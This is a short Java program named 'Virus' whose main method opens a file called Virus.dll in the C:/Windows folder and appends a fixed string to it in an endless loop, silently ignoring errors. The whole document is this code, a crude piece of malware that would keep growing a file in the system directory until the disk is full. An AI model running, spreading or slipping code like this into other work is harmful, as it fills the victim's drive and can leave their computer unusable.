
import java.io.*;
class Virus
{
public static void main(String ar[])
 {
   try
  {
   FileWriter f=new FileWriter("C:/Windows/Virus.dll",true);
   while(true)
   {
   f.write("Programming Is Such A FUN !!!");
   }
  }
  catch(FileNotFoundException e){}
   catch(IOException e){}
 }
} 
